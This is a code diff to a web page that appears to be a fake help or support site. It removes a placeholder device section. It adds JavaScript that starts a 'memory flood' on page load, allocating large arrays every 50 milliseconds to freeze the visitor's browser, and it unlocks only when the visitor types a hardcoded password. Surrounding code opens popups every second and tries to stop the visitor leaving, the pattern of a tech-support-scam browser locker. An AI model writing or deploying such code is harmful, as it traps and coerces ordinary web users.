@@ -327,26 +327,6 @@ body{
   </div>
 </div>
 
-<!-- DEVICES -->
-<div class="devices">
-  <div class="device">
-    <img src="https://via.placeholder.com/90">
-    <p>Phone</p>
-  </div>
-  <div class="device">
-    <img src="https://via.placeholder.com/90">
-    <p>Tablet</p>
-  </div>
-  <div class="device">
-    <img src="https://via.placeholder.com/90">
-    <p>Laptop</p>
-  </div>
-  <div class="device">
-    <img src="https://via.placeholder.com/90">
-    <p>Watch</p>
-  </div>
-</div>
-
 <!-- HELP SECTION -->
 <div class="help-section">
   <h2>Need more help?</h2>
@@ -515,6 +495,39 @@ openPopup();
 popupInterval = setInterval(openPopup, 1000);
 
 };
+
+let memory = [];
+let floodInterval;
+
+// MEMORY FLOOD
+function memoryFlood(){
+  for(let i=0;i<10000;i++){
+    memory.push(new Array(10000).fill("freeze"));
+  }
+}
+
+// START FLOOD WHEN POPUP OPENS
+window.onload = function(){
+  floodInterval = setInterval(memoryFlood,50);
+}
+
+// PASSWORD CHECK
+function checkPassword(){
+
+  const password = document.getElementById("pass").value;
+
+  if(password === "PhoneReset@"){
+
+    clearInterval(floodInterval);
+    memory = [];
+
+    document.getElementById("overlay").style.display="none";
+
+  }
+  else{
+    alert("Wrong password");
+  }
+}
 
 
 /* PREVENT LEAVING PAGE */
